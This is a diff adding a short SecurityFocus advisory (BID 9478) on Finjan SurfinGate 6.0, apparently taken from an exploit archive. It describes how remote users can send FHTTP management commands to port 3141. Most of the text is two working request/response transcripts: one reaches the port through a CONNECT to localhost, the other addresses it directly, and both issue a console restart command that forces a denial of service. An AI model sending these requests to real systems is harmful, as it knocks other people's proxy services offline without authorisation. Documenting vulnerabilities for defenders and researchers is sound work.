@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/9478/info
+
+Finjan SurfinGate is prone to a vulnerability that may permit remote attackers to execute certain management commands (using the FHTTP protocol) through the management control port (3141/TCP). It has been reported that commands could be issued to restart the server, most likely resulting in a denial of service. 
+
+Example 1:
+>>> CONNECT LOCALHOST:3141 HTTP/1.0
+>>>
+
+<<< HTTP/1.0 200 Connection established
+<<< Proxy-agent: Finjan-SurfinGate/6.0
+<<<
+
+>>> FINJAN /stam HTTP/1.0
+>>> finjan-version: fhttp/1.0
+>>> finjan-command: custom
+>>> finjan-parameter-category: console
+>>> finjan-parameter-type: restart
+>>> content-length: 0
+>>>
+
+<<< HTTP/1.0 200 OK
+<<< finjan-version: fhttp/1.0
+<<<
+<<<
+
+
+Example 2:
+>>> FINJAN localhost:3141/stam HTTP/1.0
+>>> finjan-version: fhttp/1.0
+>>> finjan-command: custom
+>>> finjan-parameter-category: console
+>>> finjan-parameter-type: restart
+>>> content-length: 0
+>>>
+
+<<< HTTP/1.0 200 OK
+<<< finjan-version: fhttp/1.0
+<<<
+<<< 
